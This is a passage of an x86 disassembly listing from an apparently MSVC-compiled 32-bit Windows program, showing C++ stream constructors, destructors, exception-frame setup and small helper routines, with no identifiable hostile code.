  4015ae:	8b 07                	mov    (%edi),%eax
  4015b0:	8b 48 04             	mov    0x4(%eax),%ecx
  4015b3:	c7 04 0f b4 a3 40 00 	movl   $0x40a3b4,(%edi,%ecx,1)
  4015ba:	8b ce                	mov    %esi,%ecx
  4015bc:	89 75 ec             	mov    %esi,-0x14(%ebp)
  4015bf:	ff 15 1c a1 40 00    	call   *0x40a11c
  4015c5:	c6 45 fc 02          	movb   $0x2,-0x4(%ebp)
  4015c9:	8b ce                	mov    %esi,%ecx
  4015cb:	c7 06 74 a3 40 00    	movl   $0x40a374,(%esi)
  4015d1:	ff 15 04 a1 40 00    	call   *0x40a104
  4015d7:	c7 46 3c 20 00 00 00 	movl   $0x20,0x3c(%esi)
  4015de:	89 5e 40             	mov    %ebx,0x40(%esi)
  4015e1:	89 5e 44             	mov    %ebx,0x44(%esi)
  4015e4:	89 5e 4c             	mov    %ebx,0x4c(%esi)
  4015e7:	89 5e 50             	mov    %ebx,0x50(%esi)
  4015ea:	c7 46 48 04 00 00 00 	movl   $0x4,0x48(%esi)
  4015f1:	8b c7                	mov    %edi,%eax
  4015f3:	8b 4d f4             	mov    -0xc(%ebp),%ecx
  4015f6:	64 89 0d 00 00 00 00 	mov    %ecx,%fs:0x0
  4015fd:	59                   	pop    %ecx
  4015fe:	5f                   	pop    %edi
  4015ff:	5e                   	pop    %esi
  401600:	5b                   	pop    %ebx
  401601:	8b e5                	mov    %ebp,%esp
  401603:	5d                   	pop    %ebp
  401604:	c2 04 00             	ret    $0x4
  401607:	cc                   	int3
  401608:	cc                   	int3
  401609:	cc                   	int3
  40160a:	cc                   	int3
  40160b:	cc                   	int3
  40160c:	cc                   	int3
  40160d:	cc                   	int3
  40160e:	cc                   	int3
  40160f:	cc                   	int3
  401610:	55                   	push   %ebp
  401611:	8b ec                	mov    %esp,%ebp
  401613:	6a ff                	push   $0xffffffff
  401615:	68 65 8c 40 00       	push   $0x408c65
  40161a:	64 a1 00 00 00 00    	mov    %fs:0x0,%eax
  401620:	50                   	push   %eax
  401621:	83 ec 08             	sub    $0x8,%esp
  401624:	56                   	push   %esi
  401625:	57                   	push   %edi
  401626:	a1 18 e0 40 00       	mov    0x40e018,%eax
  40162b:	33 c5                	xor    %ebp,%eax
  40162d:	50                   	push   %eax
  40162e:	8d 45 f4             	lea    -0xc(%ebp),%eax
  401631:	64 a3 00 00 00 00    	mov    %eax,%fs:0x0
  401637:	8b f9                	mov    %ecx,%edi
  401639:	89 7d f0             	mov    %edi,-0x10(%ebp)
  40163c:	8b 47 a8             	mov    -0x58(%edi),%eax
  40163f:	8b 48 04             	mov    0x4(%eax),%ecx
  401642:	c7 44 39 a8 b4 a3 40 	movl   $0x40a3b4,-0x58(%ecx,%edi,1)
  401649:	00 
  40164a:	8d 77 ac             	lea    -0x54(%edi),%esi
  40164d:	c7 45 fc 00 00 00 00 	movl   $0x0,-0x4(%ebp)
  401654:	89 75 ec             	mov    %esi,-0x14(%ebp)
  401657:	c7 06 74 a3 40 00    	movl   $0x40a374,(%esi)
  40165d:	c6 45 fc 01          	movb   $0x1,-0x4(%ebp)
  401661:	8b 56 48             	mov    0x48(%esi),%edx
  401664:	80 e2 09             	and    $0x9,%dl
  401667:	80 fa 01             	cmp    $0x1,%dl
  40166a:	75 20                	jne    0x40168c
  40166c:	8b 46 50             	mov    0x50(%esi),%eax
  40166f:	85 c0                	test   %eax,%eax
  401671:	74 0a                	je     0x40167d
  401673:	8b 4e 10             	mov    0x10(%esi),%ecx
  401676:	8b 09                	mov    (%ecx),%ecx
  401678:	51                   	push   %ecx
  401679:	ff d0                	call   *%eax
  40167b:	eb 0c                	jmp    0x401689
  40167d:	8b 56 10             	mov    0x10(%esi),%edx
  401680:	8b 02                	mov    (%edx),%eax
  401682:	50                   	push   %eax
  401683:	ff 15 f0 a1 40 00    	call   *0x40a1f0
  401689:	83 c4 04             	add    $0x4,%esp
  40168c:	83 66 48 f6          	andl   $0xfffffff6,0x48(%esi)
  401690:	8b ce                	mov    %esi,%ecx
  401692:	c7 46 44 00 00 00 00 	movl   $0x0,0x44(%esi)
  401699:	c6 45 fc 00          	movb   $0x0,-0x4(%ebp)
  40169d:	ff 15 18 a1 40 00    	call   *0x40a118
  4016a3:	8b 47 a8             	mov    -0x58(%edi),%eax
  4016a6:	8b 48 04             	mov    0x4(%eax),%ecx
  4016a9:	8b 15 b8 a0 40 00    	mov    0x40a0b8,%edx
  4016af:	89 54 39 a8          	mov    %edx,-0x58(%ecx,%edi,1)
  4016b3:	8b 4d f4             	mov    -0xc(%ebp),%ecx
  4016b6:	64 89 0d 00 00 00 00 	mov    %ecx,%fs:0x0
  4016bd:	59                   	pop    %ecx
  4016be:	5f                   	pop    %edi
  4016bf:	5e                   	pop    %esi
  4016c0:	8b e5                	mov    %ebp,%esp
  4016c2:	5d                   	pop    %ebp
  4016c3:	c3                   	ret
  4016c4:	cc                   	int3
  4016c5:	cc                   	int3
  4016c6:	cc                   	int3
  4016c7:	cc                   	int3
  4016c8:	cc                   	int3
  4016c9:	cc                   	int3
  4016ca:	cc                   	int3
  4016cb:	cc                   	int3
  4016cc:	cc                   	int3
  4016cd:	cc                   	int3
  4016ce:	cc                   	int3
  4016cf:	cc                   	int3
  4016d0:	55                   	push   %ebp
  4016d1:	8b ec                	mov    %esp,%ebp
  4016d3:	56                   	push   %esi
  4016d4:	8d 71 a8             	lea    -0x58(%ecx),%esi
  4016d7:	57                   	push   %edi
  4016d8:	8d 4e 58             	lea    0x58(%esi),%ecx
  4016db:	e8 30 ff ff ff       	call   0x401610
  4016e0:	8d 4e 58             	lea    0x58(%esi),%ecx
  4016e3:	ff 15 e4 a0 40 00    	call   *0x40a0e4
  4016e9:	f6 45 08 01          	testb  $0x1,0x8(%ebp)
  4016ed:	74 0a                	je     0x4016f9
  4016ef:	56                   	push   %esi
  4016f0:	ff 15 e8 a1 40 00    	call   *0x40a1e8
  4016f6:	83 c4 04             	add    $0x4,%esp
  4016f9:	5f                   	pop    %edi
  4016fa:	8b c6                	mov    %esi,%eax
  4016fc:	5e                   	pop    %esi
  4016fd:	5d                   	pop    %ebp
  4016fe:	c2 04 00             	ret    $0x4
  401701:	cc                   	int3
  401702:	cc                   	int3
  401703:	cc                   	int3
  401704:	cc                   	int3
  401705:	cc                   	int3
  401706:	cc                   	int3
  401707:	cc                   	int3
  401708:	cc                   	int3
  401709:	cc                   	int3
  40170a:	cc                   	int3
  40170b:	cc                   	int3
  40170c:	cc                   	int3
  40170d:	cc                   	int3
  40170e:	cc                   	int3
  40170f:	cc                   	int3
  401710:	56                   	push   %esi
  401711:	8b f0                	mov    %eax,%esi
  401713:	8d 4e 58             	lea    0x58(%esi),%ecx
  401716:	e8 f5 fe ff ff       	call   0x401610
  40171b:	8d 4e 58             	lea    0x58(%esi),%ecx
  40171e:	5e                   	pop    %esi
  40171f:	ff 25 e4 a0 40 00    	jmp    *0x40a0e4
  401725:	cc                   	int3
  401726:	cc                   	int3
  401727:	cc                   	int3
  401728:	cc                   	int3
  401729:	cc                   	int3
  40172a:	cc                   	int3
  40172b:	cc                   	int3
  40172c:	cc                   	int3
  40172d:	cc                   	int3
  40172e:	cc                   	int3
  40172f:	cc                   	int3
  401730:	55                   	push   %ebp
  401731:	8b ec                	mov    %esp,%ebp
  401733:	6a ff                	push   $0xffffffff
  401735:	68 b8 8b 40 00       	push   $0x408bb8
  40173a:	64 a1 00 00 00 00    	mov    %fs:0x0,%eax
  401740:	50                   	push   %eax
  401741:	56                   	push   %esi
  401742:	a1 18 e0 40 00       	mov    0x40e018,%eax
  401747:	33 c5                	xor    %ebp,%eax
  401749:	50                   	push   %eax
  40174a:	8d 45 f4             	lea    -0xc(%ebp),%eax
  40174d:	64 a3 00 00 00 00    	mov    %eax,%fs:0x0
  401753:	8b 75 08             	mov    0x8(%ebp),%esi
  401756:	c7 45 fc 00 00 00 00 	movl   $0x0,-0x4(%ebp)
  40175d:	ff 15 bc a0 40 00    	call   *0x40a0bc
  401763:	84 c0                	test   %al,%al
  401765:	75 08                	jne    0x40176f
  401767:	8b 0e                	mov    (%esi),%ecx
  401769:	ff 15 c4 a0 40 00    	call   *0x40a0c4
  40176f:	c7 45 fc ff ff ff ff 	movl   $0xffffffff,-0x4(%ebp)
  401776:	8b 06                	mov    (%esi),%eax
  401778:	8b 08                	mov    (%eax),%ecx
  40177a:	8b 51 04             	mov    0x4(%ecx),%edx
  40177d:	8b 44 02 38          	mov    0x38(%edx,%eax,1),%eax
  401781:	85 c0                	test   %eax,%eax
  401783:	74 09                	je     0x40178e
  401785:	8b 10                	mov    (%eax),%edx
  401787:	8b c8                	mov    %eax,%ecx
  401789:	8b 42 08             	mov    0x8(%edx),%eax
  40178c:	ff d0                	call   *%eax
  40178e:	8b 4d f4             	mov    -0xc(%ebp),%ecx
  401791:	64 89 0d 00 00 00 00 	mov    %ecx,%fs:0x0
  401798:	59                   	pop    %ecx
  401799:	5e                   	pop    %esi
  40179a:	8b e5                	mov    %ebp,%esp
  40179c:	5d                   	pop    %ebp
  40179d:	c2 04 00             	ret    $0x4
  4017a0:	55                   	push   %ebp
  4017a1:	8b ec                	mov    %esp,%ebp
  4017a3:	6a ff                	push   $0xffffffff
  4017a5:	68 2a 8c 40 00       	push   $0x408c2a
  4017aa:	64 a1 00 00 00 00    	mov    %fs:0x0,%eax
  4017b0:	50                   	push   %eax
  4017b1:	83 ec 24             	sub    $0x24,%esp
  4017b4:	53                   	push   %ebx
  4017b5:	56                   	push   %esi
  4017b6:	57                   	push   %edi
  4017b7:	a1 18 e0 40 00       	mov    0x40e018,%eax
  4017bc:	33 c5                	xor    %ebp,%eax
  4017be:	50                   	push   %eax
  4017bf:	8d 45 f4             	lea    -0xc(%ebp),%eax
  4017c2:	64 a3 00 00 00 00    	mov    %eax,%fs:0x0
  4017c8:	89 65 f0             	mov    %esp,-0x10(%ebp)
  4017cb:	8b 75 08             	mov    0x8(%ebp),%esi
  4017ce:	8b 45 0c             	mov    0xc(%ebp),%eax
  4017d1:	c7 45 ec 00 00 00 00 	movl   $0x0,-0x14(%ebp)
  4017d8:	8d 48 01             	lea    0x1(%eax),%ecx
  4017db:	eb 03                	jmp    0x4017e0
  4017dd:	8d 49 00             	lea    0x0(%ecx),%ecx
  4017e0:	8a 10                	mov    (%eax),%dl
  4017e2:	40                   	inc    %eax
  4017e3:	84 d2                	test   %dl,%dl
  4017e5:	75 f9                	jne    0x4017e0
  4017e7:	2b c1                	sub    %ecx,%eax
  4017e9:	89 45 e8             	mov    %eax,-0x18(%ebp)
  4017ec:	8b 06                	mov    (%esi),%eax
  4017ee:	8b 50 04             	mov    0x4(%eax),%edx
  4017f1:	8b 4c 32 24          	mov    0x24(%edx,%esi,1),%ecx
  4017f5:	8b 44 32 20          	mov    0x20(%edx,%esi,1),%eax
  4017f9:	33 ff                	xor    %edi,%edi
  4017fb:	85 c9                	test   %ecx,%ecx
  4017fd:	7c 1f                	jl     0x40181e
  4017ff:	7f 04                	jg     0x401805
  401801:	85 c0                	test   %eax,%eax
  401803:	74 19                	je     0x40181e
  401805:	3b cf                	cmp    %edi,%ecx
  401807:	7c 15                	jl     0x40181e
  401809:	7f 05                	jg     0x401810
  40180b:	3b 45 e8             	cmp    -0x18(%ebp),%eax
  40180e:	76 0e                	jbe    0x40181e
  401810:	2b 45 e8             	sub    -0x18(%ebp),%eax
  401813:	1b cf                	sbb    %edi,%ecx
  401815:	8b f9                	mov    %ecx,%edi
  401817:	8b d8                	mov    %eax,%ebx
  401819:	89 7d dc             	mov    %edi,-0x24(%ebp)
  40181c:	eb 07                	jmp    0x401825
  40181e:	33 db                	xor    %ebx,%ebx
  401820:	89 5d dc             	mov    %ebx,-0x24(%ebp)
  401823:	8b fb                	mov    %ebx,%edi
  401825:	8b 54 32 38          	mov    0x38(%edx,%esi,1),%edx
  401829:	89 75 d0             	mov    %esi,-0x30(%ebp)
  40182c:	85 d2                	test   %edx,%edx
  40182e:	74 09                	je     0x401839
  401830:	8b 02                	mov    (%edx),%eax
  401832:	8b ca                	mov    %edx,%ecx
  401834:	8b 50 04             	mov    0x4(%eax),%edx
  401837:	ff d2                	call   *%edx
  401839:	c7 45 fc 00 00 00 00 	movl   $0x0,-0x4(%ebp)
  401840:	8b 06                	mov    (%esi),%eax
  401842:	8b 40 04             	mov    0x4(%eax),%eax
  401845:	83 7c 30 0c 00       	cmpl   $0x0,0xc(%eax,%esi,1)
  40184a:	75 10                	jne    0x40185c
  40184c:	8b 44 30 3c          	mov    0x3c(%eax,%esi,1),%eax
  401850:	85 c0                	test   %eax,%eax
  401852:	74 08                	je     0x40185c
  401854:	8b c8                	mov    %eax,%ecx
  401856:	ff 15 cc a0 40 00    	call   *0x40a0cc
  40185c:	8b 16                	mov    (%esi),%edx
  40185e:	8b 42 04             	mov    0x4(%edx),%eax
  401861:	83 7c 30 0c 00       	cmpl   $0x0,0xc(%eax,%esi,1)
  401866:	0f 94 c1             	sete   %cl
  401869:	88 4d d4             	mov    %cl,-0x2c(%ebp)
  40186c:	c7 45 fc 01 00 00 00 	movl   $0x1,-0x4(%ebp)
  401873:	84 c9                	test   %cl,%cl
  401875:	75 0c                	jne    0x401883
  401877:	c7 45 ec 04 00 00 00 	movl   $0x4,-0x14(%ebp)
  40187e:	e9 8d 00 00 00       	jmp    0x401910
  401883:	c6 45 fc 02          	movb   $0x2,-0x4(%ebp)
  401887:	8b 44 30 14          	mov    0x14(%eax,%esi,1),%eax
  40188b:	25 c0 01 00 00       	and    $0x1c0,%eax
  401890:	83 f8 40             	cmp    $0x40,%eax
  401893:	74 37                	je     0x4018cc
  401895:	85 ff                	test   %edi,%edi
  401897:	7c 2d                	jl     0x4018c6
  401899:	7f 04                	jg     0x40189f
  40189b:	85 db                	test   %ebx,%ebx
  40189d:	74 27                	je     0x4018c6
  40189f:	8b 0e                	mov    (%esi),%ecx
  4018a1:	8b 41 04             	mov    0x4(%ecx),%eax
  4018a4:	8a 4c 30 40          	mov    0x40(%eax,%esi,1),%cl
  4018a8:	88 4d e4             	mov    %cl,-0x1c(%ebp)
  4018ab:	8b 55 e4             	mov    -0x1c(%ebp),%edx
  4018ae:	8b 4c 30 38          	mov    0x38(%eax,%esi,1),%ecx
  4018b2:	52                   	push   %edx
  4018b3:	ff 15 c8 a0 40 00    	call   *0x40a0c8
  4018b9:	83 f8 ff             	cmp    $0xffffffff,%eax
  4018bc:	0f 85 ac 00 00 00    	jne    0x40196e
  4018c2:	83 4d ec 04          	orl    $0x4,-0x14(%ebp)
  4018c6:	83 7d ec 00          	cmpl   $0x0,-0x14(%ebp)
  4018ca:	75 2e                	jne    0x4018fa
  4018cc:	8b 06                	mov    (%esi),%eax
  4018ce:	8b 48 04             	mov    0x4(%eax),%ecx
  4018d1:	8b 55 e8             	mov    -0x18(%ebp),%edx
  4018d4:	8b 45 0c             	mov    0xc(%ebp),%eax
  4018d7:	8b 4c 31 38          	mov    0x38(%ecx,%esi,1),%ecx
  4018db:	33 ff                	xor    %edi,%edi
  4018dd:	57                   	push   %edi
  4018de:	52                   	push   %edx
  4018df:	50                   	push   %eax
  4018e0:	ff 15 c0 a0 40 00    	call   *0x40a0c0
  4018e6:	3b 45 e8             	cmp    -0x18(%ebp),%eax
  4018e9:	75 08                	jne    0x4018f3
  4018eb:	3b d7                	cmp    %edi,%edx
  4018ed:	0f 84 8d 00 00 00    	je     0x401980
  4018f3:	c7 45 ec 04 00 00 00 	movl   $0x4,-0x14(%ebp)
  4018fa:	8b 16                	mov    (%esi),%edx
  4018fc:	8b 42 04             	mov    0x4(%edx),%eax
  4018ff:	33 c9                	xor    %ecx,%ecx
  401901:	89 4c 30 20          	mov    %ecx,0x20(%eax,%esi,1)
  401905:	89 4c 30 24          	mov    %ecx,0x24(%eax,%esi,1)
  401909:	c7 45 fc 01 00 00 00 	movl   $0x1,-0x4(%ebp)
  401910:	8b 0e                	mov    (%esi),%ecx
  401912:	8b 45 ec             	mov    -0x14(%ebp),%eax
  401915:	8b 49 04             	mov    0x4(%ecx),%ecx
  401918:	6a 00                	push   $0x0
  40191a:	50                   	push   %eax
  40191b:	03 ce                	add    %esi,%ecx
  40191d:	ff 15 e0 a0 40 00    	call   *0x40a0e0
  401923:	c7 45 fc 04 00 00 00 	movl   $0x4,-0x4(%ebp)
  40192a:	ff 15 bc a0 40 00    	call   *0x40a0bc
  401930:	8b 7d d0             	mov    -0x30(%ebp),%edi
  401933:	84 c0                	test   %al,%al
  401935:	75 08                	jne    0x40193f
  401937:	8b cf                	mov    %edi,%ecx
  401939:	ff 15 c4 a0 40 00    	call   *0x40a0c4
  40193f:	c7 45 fc ff ff ff ff 	movl   $0xffffffff,-0x4(%ebp)
  401946:	8b 17                	mov    (%edi),%edx
  401948:	8b 42 04             	mov    0x4(%edx),%eax
  40194b:	8b 4c 38 38          	mov    0x38(%eax,%edi,1),%ecx
  40194f:	85 c9                	test   %ecx,%ecx
  401951:	74 07                	je     0x40195a
  401953:	8b 11                	mov    (%ecx),%edx
  401955:	8b 42 08             	mov    0x8(%edx),%eax
  401958:	ff d0                	call   *%eax
  40195a:	8b c6                	mov    %esi,%eax
  40195c:	8b 4d f4             	mov    -0xc(%ebp),%ecx
  40195f:	64 89 0d 00 00 00 00 	mov    %ecx,%fs:0x0
  401966:	59                   	pop    %ecx
  401967:	5f                   	pop    %edi
  401968:	5e                   	pop    %esi
  401969:	5b                   	pop    %ebx
  40196a:	8b e5                	mov    %ebp,%esp
  40196c:	5d                   	pop    %ebp
  40196d:	c3                   	ret
  40196e:	83 c3 ff             	add    $0xffffffff,%ebx
  401971:	83 d7 ff             	adc    $0xffffffff,%edi
  401974:	89 7d dc             	mov    %edi,-0x24(%ebp)
  401977:	e9 19 ff ff ff       	jmp    0x401895
  40197c:	8d 64 24 00          	lea    0x0(%esp),%esp
  401980:	39 7d dc             	cmp    %edi,-0x24(%ebp)
  401983:	0f 8c 71 ff ff ff    	jl     0x4018fa
  401989:	7f 08                	jg     0x401993
  40198b:	85 db                	test   %ebx,%ebx
  40198d:	0f 84 67 ff ff ff    	je     0x4018fa
  401993:	8b 0e                	mov    (%esi),%ecx
  401995:	8b 41 04             	mov    0x4(%ecx),%eax
  401998:	8a 4c 30 40          	mov    0x40(%eax,%esi,1),%cl
  40199c:	88 4d e4             	mov    %cl,-0x1c(%ebp)
  40199f:	8b 55 e4             	mov    -0x1c(%ebp),%edx
  4019a2:	8b 4c 30 38          	mov    0x38(%eax,%esi,1),%ecx
  4019a6:	52                   	push   %edx
  4019a7:	ff 15 c8 a0 40 00    	call   *0x40a0c8
  4019ad:	83 f8 ff             	cmp    $0xffffffff,%eax
  4019b0:	75 09                	jne    0x4019bb
  4019b2:	83 4d ec 04          	orl    $0x4,-0x14(%ebp)
  4019b6:	e9 3f ff ff ff       	jmp    0x4018fa
  4019bb:	83 c3 ff             	add    $0xffffffff,%ebx
  4019be:	83 55 dc ff          	adcl   $0xffffffff,-0x24(%ebp)
  4019c2:	eb bc                	jmp    0x401980
  4019c4:	8b 45 08             	mov    0x8(%ebp),%eax
  4019c7:	8b 08                	mov    (%eax),%ecx
  4019c9:	8b 49 04             	mov    0x4(%ecx),%ecx
  4019cc:	6a 01                	push   $0x1
  4019ce:	6a 04                	push   $0x4
  4019d0:	03 c8                	add    %eax,%ecx
  4019d2:	ff 15 e0 a0 40 00    	call   *0x40a0e0
  4019d8:	c7 45 fc 01 00 00 00 	movl   $0x1,-0x4(%ebp)
  4019df:	b8 e5 19 40 00       	mov    $0x4019e5,%eax
  4019e4:	c3                   	ret
  4019e5:	8b 75 08             	mov    0x8(%ebp),%esi
  4019e8:	e9 23 ff ff ff       	jmp    0x401910
  4019ed:	cc                   	int3
  4019ee:	cc                   	int3
  4019ef:	cc                   	int3
  4019f0:	c7 01 e4 a8 40 00    	movl   $0x40a8e4,(%ecx)
  4019f6:	ff 25 f8 a1 40 00    	jmp    *0x40a1f8
  4019fc:	cc                   	int3
  4019fd:	cc                   	int3
  4019fe:	cc                   	int3
  4019ff:	cc                   	int3
  401a00:	55                   	push   %ebp
  401a01:	8b ec                	mov    %esp,%ebp
  401a03:	56                   	push   %esi
  401a04:	8b f1                	mov    %ecx,%esi
  401a06:	c7 06 e4 a8 40 00    	movl   $0x40a8e4,(%esi)
  401a0c:	ff 15 f8 a1 40 00    	call   *0x40a1f8
  401a12:	f6 45 08 01          	testb  $0x1,0x8(%ebp)
  401a16:	74 0a                	je     0x401a22
  401a18:	56                   	push   %esi
  401a19:	ff 15 e8 a1 40 00    	call   *0x40a1e8
  401a1f:	83 c4 04             	add    $0x4,%esp
  401a22:	8b c6                	mov    %esi,%eax
  401a24:	5e                   	pop    %esi
  401a25:	5d                   	pop    %ebp
  401a26:	c2 04 00             	ret    $0x4
  401a29:	cc                   	int3
  401a2a:	cc                   	int3
  401a2b:	cc                   	int3
  401a2c:	cc                   	int3
  401a2d:	cc                   	int3
  401a2e:	cc                   	int3
  401a2f:	cc                   	int3
  401a30:	c3                   	ret
  401a31:	cc                   	int3
  401a32:	cc                   	int3
  401a33:	cc                   	int3
  401a34:	cc                   	int3
  401a35:	cc                   	int3
  401a36:	cc                   	int3
  401a37:	cc                   	int3
  401a38:	cc                   	int3
  401a39:	cc                   	int3
  401a3a:	cc                   	int3
  401a3b:	cc                   	int3
  401a3c:	cc                   	int3
  401a3d:	cc                   	int3
  401a3e:	cc                   	int3
  401a3f:	cc                   	int3
  401a40:	56                   	push   %esi
  401a41:	8b f0                	mov    %eax,%esi
  401a43:	57                   	push   %edi
  401a44:	83 fe 04             	cmp    $0x4,%esi
  401a47:	72 1b                	jb     0x401a64
  401a49:	8d a4 24 00 00 00 00 	lea    0x0(%esp),%esp
  401a50:	8b 02                	mov    (%edx),%eax
  401a52:	3b 01                	cmp    (%ecx),%eax
  401a54:	75 12                	jne    0x401a68
  401a56:	83 ee 04             	sub    $0x4,%esi
  401a59:	83 c1 04             	add    $0x4,%ecx
  401a5c:	83 c2 04             	add    $0x4,%edx
  401a5f:	83 fe 04             	cmp    $0x4,%esi
  401a62:	73 ec                	jae    0x401a50
  401a64:	85 f6                	test   %esi,%esi
  401a66:	74 44                	je     0x401aac
  401a68:	0f b6 02             	movzbl (%edx),%eax
  401a6b:	0f b6 39             	movzbl (%ecx),%edi
  401a6e:	2b c7                	sub    %edi,%eax
  401a70:	75 31                	jne    0x401aa3
  401a72:	83 fe 01             	cmp    $0x1,%esi
  401a75:	76 35                	jbe    0x401aac
  401a77:	0f b6 42 01          	movzbl 0x1(%edx),%eax
  401a7b:	0f b6 79 01          	movzbl 0x1(%ecx),%edi
  401a7f:	2b c7                	sub    %edi,%eax
  401a81:	75 20                	jne    0x401aa3
  401a83:	83 fe 02             	cmp    $0x2,%esi
  401a86:	76 24                	jbe    0x401aac
  401a88:	0f b6 42 02          	movzbl 0x2(%edx),%eax
  401a8c:	0f b6 79 02          	movzbl 0x2(%ecx),%edi
  401a90:	2b c7                	sub    %edi,%eax
  401a92:	75 0f                	jne    0x401aa3
  401a94:	83 fe 03             	cmp    $0x3,%esi
  401a97:	76 13                	jbe    0x401aac
  401a99:	0f b6 42 03          	movzbl 0x3(%edx),%eax
  401a9d:	0f b6 49 03          	movzbl 0x3(%ecx),%ecx
  401aa1:	2b c1                	sub    %ecx,%eax
  401aa3:	c1 f8 1f             	sar    $0x1f,%eax
  401aa6:	5f                   	pop    %edi
  401aa7:	83 c8 01             	or     $0x1,%eax
  401aaa:	5e                   	pop    %esi
  401aab:	c3                   	ret
  401aac:	5f                   	pop    %edi
  401aad:	33 c0                	xor    %eax,%eax
  401aaf:	5e                   	pop    %esi
  401ab0:	c3                   	ret
  401ab1:	cc                   	int3
  401ab2:	cc                   	int3
  401ab3:	cc                   	int3
  401ab4:	cc                   	int3
  401ab5:	cc                   	int3
  401ab6:	cc                   	int3
  401ab7:	cc                   	int3
  401ab8:	cc                   	int3
  401ab9:	cc                   	int3
  401aba:	cc                   	int3
  401abb:	cc                   	int3
  401abc:	cc                   	int3
  401abd:	cc                   	int3
  401abe:	cc                   	int3
  401abf:	cc                   	int3
  401ac0:	8b 08                	mov    (%eax),%ecx
  401ac2:	85 c9                	test   %ecx,%ecx
  401ac4:	74 14                	je     0x401ada
  401ac6:	ff 15 90 a0 40 00    	call   *0x40a090
  401acc:	85 c0                	test   %eax,%eax
  401ace:	74 0a                	je     0x401ada
  401ad0:	8b 10                	mov    (%eax),%edx
  401ad2:	8b c8                	mov    %eax,%ecx
  401ad4:	8b 02                	mov    (%edx),%eax
  401ad6:	6a 01                	push   $0x1
  401ad8:	ff d0                	call   *%eax
  401ada:	c3                   	ret
  401adb:	cc                   	int3
  401adc:	cc                   	int3
  401add:	cc                   	int3
  401ade:	cc                   	int3
  401adf:	cc                   	int3
  401ae0:	55                   	push   %ebp
  401ae1:	8b ec                	mov    %esp,%ebp
  401ae3:	68 50 a4 40 00       	push   $0x40a450
  401ae8:	ff 15 14 a2 40 00    	call   *0x40a214
  401aee:	83 c4 04             	add    $0x4,%esp
  401af1:	85 c0                	test   %eax,%eax
  401af3:	75 02                	jne    0x401af7
  401af5:	5d                   	pop    %ebp
  401af6:	c3                   	ret
  401af7:	53                   	push   %ebx
  401af8:	56                   	push   %esi
  401af9:	8b 35 1c a2 40 00    	mov    0x40a21c,%esi
  401aff:	57                   	push   %edi
  401b00:	68 5c a4 40 00       	push   $0x40a45c
  401b05:	ff d6                	call   *%esi
  401b07:	8b 1d 18 a2 40 00    	mov    0x40a218,%ebx
  401b0d:	83 c0 40             	add    $0x40,%eax
  401b10:	50                   	push   %eax
  401b11:	ff d3                	call   *%ebx
  401b13:	8b 4d 08             	mov    0x8(%ebp),%ecx
  401b16:	8b f8                	mov    %eax,%edi
  401b18:	83 c4 08             	add    $0x8,%esp
  401b1b:	8d 45 0c             	lea    0xc(%ebp),%eax
  401b1e:	50                   	push   %eax
  401b1f:	51                   	push   %ecx
  401b20:	ff d6                	call   *%esi
  401b22:	83 c0 40             	add    $0x40,%eax
  401b25:	50                   	push   %eax
  401b26:	ff 15 20 a2 40 00    	call   *0x40a220
  401b2c:	83 c4 0c             	add    $0xc,%esp
  401b2f:	68 68 a4 40 00       	push   $0x40a468
  401b34:	03 f8                	add    %eax,%edi
  401b36:	ff d6                	call   *%esi
  401b38:	83 c0 40             	add    $0x40,%eax
  401b3b:	50                   	push   %eax
  401b3c:	ff d3                	call   *%ebx
  401b3e:	83 c4 08             	add    $0x8,%esp
  401b41:	03 c7                	add    %edi,%eax
  401b43:	5f                   	pop    %edi
  401b44:	5e                   	pop    %esi
  401b45:	5b                   	pop    %ebx
  401b46:	5d                   	pop    %ebp
  401b47:	c3                   	ret
  401b48:	cc                   	int3
  401b49:	cc                   	int3
  401b4a:	cc                   	int3
  401b4b:	cc                   	int3
  401b4c:	cc                   	int3
  401b4d:	cc                   	int3
  401b4e:	cc                   	int3
  401b4f:	cc                   	int3
  401b50:	55                   	push   %ebp
  401b51:	8b ec                	mov    %esp,%ebp
  401b53:	68 6c a4 40 00       	push   $0x40a46c
  401b58:	ff 15 14 a2 40 00    	call   *0x40a214
  401b5e:	83 c4 04             	add    $0x4,%esp
  401b61:	85 c0                	test   %eax,%eax
  401b63:	75 02                	jne    0x401b67
  401b65:	5d                   	pop    %ebp
  401b66:	c3                   	ret
  401b67:	53                   	push   %ebx
  401b68:	56                   	push   %esi
  401b69:	8b 35 1c a2 40 00    	mov    0x40a21c,%esi
  401b6f:	57                   	push   %edi
  401b70:	68 78 a4 40 00       	push   $0x40a478
  401b75:	ff d6                	call   *%esi
  401b77:	8b 1d 18 a2 40 00    	mov    0x40a218,%ebx
  401b7d:	83 c0 40             	add    $0x40,%eax
  401b80:	50                   	push   %eax
  401b81:	ff d3                	call   *%ebx
  401b83:	8b 4d 08             	mov    0x8(%ebp),%ecx
  401b86:	8b f8                	mov    %eax,%edi
  401b88:	83 c4 08             	add    $0x8,%esp
  401b8b:	8d 45 0c             	lea    0xc(%ebp),%eax
  401b8e:	50                   	push   %eax
  401b8f:	51                   	push   %ecx
  401b90:	ff d6                	call   *%esi
  401b92:	83 c0 40             	add    $0x40,%eax
  401b95:	50                   	push   %eax
  401b96:	ff 15 20 a2 40 00    	call   *0x40a220
  401b9c:	83 c4 0c             	add    $0xc,%esp
  401b9f:	68 68 a4 40 00       	push   $0x40a468
  401ba4:	03 f8                	add    %eax,%edi
  401ba6:	ff d6                	call   *%esi
  401ba8:	83 c0 40             	add    $0x40,%eax
  401bab:	50                   	push   %eax
  401bac:	ff d3                	call   *%ebx
  401bae:	83 c4 08             	add    $0x8,%esp
  401bb1:	03 c7                	add    %edi,%eax
  401bb3:	5f                   	pop    %edi
  401bb4:	5e                   	pop    %esi
  401bb5:	5b                   	pop    %ebx
  401bb6:	5d                   	pop    %ebp
  401bb7:	c3                   	ret
  401bb8:	cc                   	int3
  401bb9:	cc                   	int3
  401bba:	cc                   	int3
  401bbb:	cc                   	int3
  401bbc:	cc                   	int3
  401bbd:	cc                   	int3
  401bbe:	cc                   	int3
  401bbf:	cc                   	int3
  401bc0:	55                   	push   %ebp
  401bc1:	8b ec                	mov    %esp,%ebp
  401bc3:	6a ff                	push   $0xffffffff
  401bc5:	68 f9 93 40 00       	push   $0x4093f9
  401bca:	64 a1 00 00 00 00    	mov    %fs:0x0,%eax
  401bd0:	50                   	push   %eax
  401bd1:	81 ec e4 00 00 00    	sub    $0xe4,%esp
  401bd7:	a1 18 e0 40 00       	mov    0x40e018,%eax
  401bdc:	33 c5                	xor    %ebp,%eax
  401bde:	89 45 f0             	mov    %eax,-0x10(%ebp)
  401be1:	53                   	push   %ebx
  401be2:	56                   	push   %esi
